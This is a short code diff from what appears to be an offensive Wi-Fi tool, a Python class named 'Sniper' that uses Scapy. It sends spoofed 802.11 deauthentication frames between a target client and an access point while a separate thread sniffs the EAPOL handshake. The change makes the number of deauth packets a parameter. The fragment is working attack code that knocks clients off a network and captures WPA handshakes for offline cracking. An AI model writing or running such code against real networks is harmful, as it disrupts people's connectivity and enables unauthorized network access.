@@ -153,7 +153,7 @@ class Sniper:
 					self.__c_HANDSHAKE[3] = pkt
 		return
 
-	def shoot(self, tgt):
+	def shoot(self, tgt, deauth):
 		self.__c_TGT = tgt
 		sniffer_thread = threading.Thread(target=self.start_eapol_sniffer)
 		sniffer_thread.daemon = True
@@ -165,7 +165,7 @@ class Sniper:
 		__pkt_to_cl = RadioTap() / Dot11(addr1=tgt, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
 		__pkt_to_ap = RadioTap() / Dot11(addr1=self.bssid, addr2=tgt, addr3=tgt) / Dot11Deauth(reason=7)
 
-		for n in range(32 * 1):
+		for n in range(deauth * 1):
 			sendp(__pkt_to_cl, iface=self.iface, count=1, verbose=False)
 			sendp(__pkt_to_ap, iface=self.iface, count=1, verbose=False)
 
